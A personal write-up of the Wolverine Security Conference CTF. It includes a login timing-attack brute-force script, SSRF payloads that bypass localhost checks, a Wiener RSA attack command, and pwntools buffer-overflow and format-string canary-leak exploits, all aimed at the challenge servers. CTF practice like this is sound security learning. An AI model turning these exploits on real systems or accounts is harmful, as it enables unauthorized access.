# Wolverine Security Conference/CTF

This was one of the better CTFs I've played in a while. The challenges were perfect and I really liked them. They didn't involve guessy-ness and even if they did, there was a reasonable way to approach the solution. My [team](https://ctftime.org/team/166645) ranked 37 in the CTF, but I believe it could've have been much higher. Here are my writeups (they're not very detailed because I'm just trying to maintain an archive for myself with this writeup).



## Challenges

#### Forensics

- [x] Lecture\_22\_Forensics (349)
- [x] Forensics...kinda (371)
- [ ] Flaggy (495)
- [ ] Noise (498)
- [ ] sickbeatbro (500)

#### Crypto
- [x] ANYTHING (100)
- [x] RSA With The Dogs (441)
- [ ] EAV-Secure Diffie-Hellman? (495)
- [x] Mr. Johnson's Bank (498)
- [ ] RSA Frustration (499)
- [ ] CPA-Secure Diffie-Hellman? (500)
- [ ] Alice, Bob & Eve (500)

#### Reverse

- [x] babyre0 (100)
- [x] babyre1 (100)
- [ ] n33dl3 (428)
- [ ] smol (494)
- [ ] symmetry (499)
- [ ] WolvField (500)
- [ ] Spirits (500)
- [ ] SLA 65 (500)

#### Web

- [x] Warmup: Burp! (100)
- [x] SSRF 101 (241)
- [x] SSRF 301 (375)
- [ ] Java??? (488)
- [ ] XSS 401 (496)
- [ ] Don't Only Mash, Clobber! (498)
- [ ] Autoraider (500)

#### OSINT

- [x] U of M Student Orgs! (244)
- [x] Secret drop-off location (364)
- [x] I want a private plane! (398)
- [ ] Where in the world? (486)
- [ ] U of M Study Spot! (490)

#### PWN

- [x] babyret (244)
- [x] string0 (374)
- [ ] Us3_th3_F0rc3 (489)



### Lecture_22_Forensics

> My professor told me I might find something useful in these slides...
Attachments: [Lecture_22_Forensics](https://ctf.wolvseccon.org/files/8c3c514a2c871a1515d92f90cd0f68e6/Lecture_22__Forensics.pdf?token=eyJ1c2VyX2lkIjoyMDIsInRlYW1faWQiOjk4LCJmaWxlX2lkIjozOH0.YkGppg.SpCPK82gIv7MgSQHSpMy__G2zjQ)

We are provided with a pdf file. If we open it with a PDF reader and try searching for the flag format "wsc" using CTRL+F, we can see that there is a match but we aren't really able to see the flag. However, we can use a tool like `pdftotext` to extract all the text from the PDF and the find the flag.

We run `pdftotext Lecture_22_Forensics; cat Lecture_22_Forensics.txt | grep wsc`

**Flag:** `wsc{y0u_c4nT_$ee_m3}`



### Forensics...kinda

> This image has been a bit shifty - can't seem to find the message my friend encoded in it!

![forensics-kinda.png](./images/forensics-kinda.png)

The statement hints towards "bit"'s which means it probably involves some sort of bit manipulation in the image. We can simply run `zsteg` on the image and find the flag hidden in the lowest significant bits of the image.

**Flag:** `wsc{g0_blu3}`



### ANYTHING

> This could be encrypted with ANYTHING! wfa{oporteec_gvb_ogd}

We guess that this is a vigenere cipher and use an online decrypter to decipher the flag using the key "ANYTHING".

**Flag:** `wsc{vigenere_not_bad}`



### RSA With The Dogs

> I was doing RSA with the dogs so that we could send stuff to each other. Unfortunately the cats are stealing our messages...

We're provided with a sage script that is used as a generator for this challenge. Here's the gen.sage file:

```python
from random import getrandbits
from Crypto.Util.number import bytes_to_long

p = random_prime(2^(1024//2),False,2^(1023//2))
q = random_prime(2^(1024//2),False,2^(1023//2))

n = p*q
phi = (p-1) * (q-1)

done = False
while not done:
    d = getrandbits(1024//4)
    if (gcd(d,phi) == 1 and 36*pow(d,4) < n):
        done = True
                

Flag = open('flag.txt').read().encode()
m=bytes_to_long(Flag)
e = Integer(d).inverse_mod(phi)
c=pow(m,e,n)
print("n =",n)
print("e =",e)
print("c =",c)

n = 80958280137410344469270793621735550547403923964041971008952114628165974409360380289792220885326992426579868790128162893145613324338067958789899179419581085862309223717281585829617191377490590947730109453817502130283318153315193437990052156404947863059961976057429879645314342452813233368655425822274689461707
e = 3575901247532182907389411227211529824636724376722157756567776602226084740339294992167070515627141715229879280406393029563498781044157896403506408797685517148091205601955885898295742740813509895317351882951244059944509598074900130252149053360447229439583686319853300112906033979011695531155686173063061146739
c = 80629080505342932586166479028264765764709326746119909040860609021743893395577080637958779561184335633322859567681317501709922573784403504695809067898870536224427948000498261469984511352960143456934810825186736399371084350678586129000118485271831798923746976704036847707653422361120164687989605124465224952493

assert(int(pow(c,d,n)) == m)
```

As can be seen, the exponent is very huge and it was generated such that O(d) < O(n ** (1 / 4)). This is usually a hint towards the weiner attack against RSA. We can write our own solution script implementing the weiner attack or alternatively use the [RsaCtfTool.py](https://github.com/Ganapati/RsaCtfTool) to automate the attack for us

```
rsatool -n 80958280137410344469270793621735550547403923964041971008952114628165974409360380289792220885326992426579868790128162893145613324338067958789899179419581085862309223717281585829617191377490590947730109453817502130283318153315193437990052156404947863059961976057429879645314342452813233368655425822274689461707 -e 3575901247532182907389411227211529824636724376722157756567776602226084740339294992167070515627141715229879280406393029563498781044157896403506408797685517148091205601955885898295742740813509895317351882951244059944509598074900130252149053360447229439583686319853300112906033979011695531155686173063061146739 --uncipher 80629080505342932586166479028264765764709326746119909040860609021743893395577080637958779561184335633322859567681317501709922573784403504695809067898870536224427948000498261469984511352960143456934810825186736399371084350678586129000118485271831798923746976704036847707653422361120164687989605124465224952493 --attack wiener
```

**Flag:** `wsc{w13n3r5_wer3_bre4d_t0_hunt_b4dger5!}`



### Mr. Johnson's Bank

> How quickly can you break into Mr. Johnson's bank account? Tick Tock!
https://mr-johnsons-bank-1-bvel4oasra-uc.a.run.app

This was my favourite challenge in the CTF because I learnt something new from it. We're given a website where we need to login as William Johnson using his credentials. The website tells us whether we entered the wrong username or password. The first part of the challenge is guessing the right username. After a few tries, we find that `wjohnson` is the correct username.

There is also a message on the webpage that says:

> Dear Customer,
>
> Thank you for choosing Mr. Johnson's Bank!
>
> Welcome to our brand new website! You can access your banking details, pay bills, and send money any time with the click of a button!
>
> Tick Tock,
> William Johnson,
> Founder and CEO of Mr. Johnson's Bank

The reference to "time" and "tick tock" in the message hint us towards a timing attack. The idea is to basically try and bruteforce the password character by character. This works because when a character from our guess matches a character in the password at the correct location, then it takes a slightly longer time for us to receive the response than it takes if the guessed character was incorrect. This can be tested out by calculating the time taken between request and response and averaging them over a few repeats to account for some random delays. I wrote a small script that I ran manually a couple 100 times to brute force the password "pass9f6x".

```python
import requests
import time
import string
from bs4 import BeautifulSoup

url = 'https://mr-johnsons-bank-1-bvel4oasra-uc.a.run.app/'

password = 'passe9f6x'

for character in string.ascii_letters + string.digits:
    total = 0
    n = 1
    for _ in range(n):
        guess = password + character
        t1 = time.time()
        r = requests.post(url, data = {'username': 'wjohnson', 'password': guess})
        t2 = time.time()
        
        if 'Incorrect' not in r.url:
          print('Found:', guess)
        total += t2 - t1
    total /= n
    print(character, total)
```

After logging into Mr. John's account, we can find the flag.

**Flag:** `wsc{99eae35043c31a481e26f94feb9ed3fe}`



### babyre0

> Something to get you started.

We're provided a challenge binary. This was a simple challenge. Doing `strings babyre0 | grep wsc` gives us the flag.

**Flag:** `wsc{juST_a_b4By_RE!}`



### babyre1

> Is FLAG encoded already? Did I forget to call encode()?

We're provided a challenge binary. We can open it up with any decompiling tool. There are two functions that seem important - main and encode. The encode function simply takes in a string parameter. It then loops through every character of the string and performs an xor with `0x3b`. We can simply retrieve the flag again by performing xor on the encoded string with `0x3b` again as the xor operation is inverse of itself. We can find the encoded flag in the .data section of the binary.

```
flag = ['L', 'H', 'X', '@',
  'b','\v', 'N', 'd',
  0x0F, 'I','\b', 'd',
 '\\','\b', 'O', 'O',
 '\n', 'U','\\', 'd',
  'O', 'S','\b', 'd',
  'S', 0x0F, 'U','\\',
  'd','\v', ']', 'd',
  'o', 's', 'r', 'h',
  0x1A, 'F']


for i in range(len(flag)):
    if not isinstance(flag[i], int):
        flag[i] = ord(flag[i])
    flag[i] ^= 0x3b
    print(chr(flag[i]), end = '')
```

**Flag:** `wsc{Y0u_4r3_g3tt1ng_th3_h4ng_0f_THIS!}`



### Warmup: Burp

> Felt a little dizzy and loopy when I wrote this! My blood sugar is probably a little low...should grab some cookies!
>
> https://burp-bvel4oasra-uc.a.run.app

We can send a request to the site and notice that it redirects to a YouTube video. However, if you proxy the requests through Burp, you can notice that it redirects you through a few pages with the `?count=` parameter increasing each time. Upon reaching `?count=7`, it redirects us to an intermediate endpoint `/flag` after which it continues with incrementing `?count=` parameter till about 14. If we send a request ourselves to `/flag`, we can see that it requires us to set a cookie with a password. The password can be found in the request too as an HTML comment - "DESSERT". Sending the request again with the password cookie set gives us the flag. 

It could also be retrieved using curl with something like: `curl https://burp-bvel4oasra-uc.a.run.app/flag -H "Cookie: PASSWORD=DESSERT;"`

**Flag:** `wsc{c00k1e5_yum!}`



### SSRF 101

> Can you access the private server?
> 
> https://wsc-2022-web-1-bvel4oasra-uc.a.run.app/

We are provided the source code for this challenge. Here are the relavant files among them.

**private1.js**

```js
const express = require('express')
const app = express()
const private1Port = 1001

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/private1.js')
})

app.get('/private2', (req, res) => {
    res.sendFile(__dirname + '/private2.js')
})

// this port is only exposed locally
app.listen(private1Port, () => {
    console.log(`Listening on ${private1Port}`)
})
```

**private2.js**

```js
const express = require('express')
const app = express()
const private2Port = 10011

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/private2.js')
})

app.get('/flag', (req, res) => {
    res.sendFile(__dirname + '/flag.txt')
})

// this port is only exposed locally
app.listen(private2Port, () => {
    console.log(`Listening on ${private2Port}`)
})
```

**public.js**

```js
const { URL } = require('url')
const http = require('http')
const express = require('express')
const app = express()
const publicPort = 80
const private1Port = 1001

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public.js')
})

// Use this endpoint to reach a web server which
// is only locally accessible. Try: /ssrf?path=/
app.get('/ssrf', (req, res) => {
    const path = req.query.path
    if (typeof path !== 'string' || path.length === 0) {
        res.send('path must be a non-empty string')
    }
    else {
        const url = `http://localhost:${private1Port}${path}`
        const parsedUrl = new URL(url)

        if (parsedUrl.hostname !== 'localhost') {
            // Is it even possible to get in here???
            res.send('sorry, you can only talk to localhost')
        }
        else {
            // Make the request and return its content as our content.
            http.get(parsedUrl.href, ssrfRes => {
                let contentType = ssrfRes.headers['content-type']

                let body = ''
                ssrfRes.on('data', chunk => {
                    body += chunk
                })

                ssrfRes.on('end', () => {
                    if (contentType) {
                        res.setHeader('Content-Type', contentType)
                    }
                    res.send(body)
                })
            }).on('error', function(e) {
                res.send("Got error: " + e.message)
            })
        }
    }
})

// this port is exposed publicly 
app.listen(publicPort, () => {
  console.log(`Listening on ${publicPort}`)
})
```

As can be seen, the SSRF vulnerability lies in the statement

```
const url = `http://localhost:${private1Port}${path}`
```

The path can be controlled by an attacker. For this challenge, we can send the following request to retrieve the flag:

```
curl https://wsc-2022-web-1-bvel4oasra-uc.a.run.app/ssrf?path=1/flag
```

This works because the url that the server sends request to looks like this: `http://localhost:10011/flag`, which is where the flag hides. However, in the next challenge, we're not allowed to have a number as our first character and we'll have to resort to using something else.

**Flag:** `wsc{ssrf_c4n_b3_fun_xl9m782}`



### SSRF 301

> This is almost the same as SSRF 101. Can you get by the new restriction?
> 
> https://wsc-2022-web-4-bvel4oasra-uc.a.run.app/

The challenge is exactly the same as the previous except there is one important change in public.js.

```js
const { URL } = require('url')
const http = require('http')
const express = require('express')
const app = express()
const publicPort = 80
const private1Port = 1001

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public.js')
})

// Use this endpoint to reach a web server which
// is only locally accessible. Try: /ssrf?path=/
app.get('/ssrf', (req, res) => {
    const path = req.query.path
    if (typeof path !== 'string' || path.length === 0) {
        res.send('path must be a non-empty string')
    }
    else {
        const normalizedPath = path.normalize('NFKC')
        const firstPathChar = normalizedPath.charAt(0)
        if ('0' <= firstPathChar && firstPathChar <= '9') {
            res.send('first chararacter of path must not normalize to a digit')
        }
        else {
            const url = `http://localhost:${private1Port}${normalizedPath}`
            const parsedUrl = new URL(url)
    
            if (parsedUrl.hostname !== 'localhost') {
                // Is it even possible to get in here???
                res.send('sorry, you can only talk to localhost')
            }
            else {
                // Make the request and return its content as our content.
                http.get(parsedUrl.href, ssrfRes => {
                    let contentType = ssrfRes.headers['content-type']

                    let body = ''
                    ssrfRes.on('data', chunk => {
                        body += chunk
                    })

                    ssrfRes.on('end', () => {
                        if (contentType) {
                            res.setHeader('Content-Type', contentType)
                        }
                        res.send(body)
                    })
                }).on('error', function(e) {
                    res.send("Got error: " + e.message)
                })
            }
        }
    }
})

// this port is exposed publicly 
app.listen(publicPort, () => {
  console.log(`Listening on ${publicPort}`)
})
```

Alright, so what we did last time will not work here as the first character cannot be a digit. We can however still change the host we're sending a request to using the `@` syntax in a URL. It can be done with something like:

```
curl https://wsc-2022-web-1-bvel4oasra-uc.a.run.app/ssrf?path=@localhost:10011/flag
```

**Flag:** `wsc{url_synt4x_f0r_th3_w1n_hq32pl}`



### babyRet

> As promised a pwn challenge...
> 
> nc 107.191.51.129 5000

Overflow buffer and overwrite return address with the address of print_flag function.

```python
from pwn import *

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript = gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './ret0'
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)
context.log_level = 'info'

io = start()

offset = 16
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

payload = flat([
    b'A' * offset,
    pop_rdi_ret,
    elf.symbols['print_flag']
])

print(io.recv().decode())
print('Payload:', payload)
io.sendline(payload)
print(io.recv().decode())

io.interactive()
```

**Flag:** `wsc{Th0s3_p3sky_STACKS!!!}`



### string0

> What type of string again?
> 
> nc 107.191.51.129 5001

Use format string vulnerability to leak canary which is present at the 11th position in the stack. Bypass canary and overwrite return address to print_flag function's address.

```python
from pwn import *
import os

def start(argv = [], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript = gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# for i in range(30):
#     print(i)
#     os.system(f'echo "%{i}\$x\na" | ./string0')
# exit()

exe = './string0'
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)
context.log_level = 'info'

io = start()

print(io.recv().decode())
io.sendline(b'%11$p')

canary = int(io.recvline().strip(), 16)
print('Canary:', hex(canary))
print(io.recv().decode())

offset = 16
pop_rdi_ret = rop.find_gadget(['pop ebp', 'ret'])[0]

payload = flat([
    asm('nop') * offset,
    canary,
    0x080493c0,
    0x080493c0,
    0x080493c0,
    0x080493c0,
    elf.symbols['print_flag']
])

io.sendline(payload)

io.interactive()
```

**Flag:** `wsc{W3_w4nt_m0R3_PWNS!}`
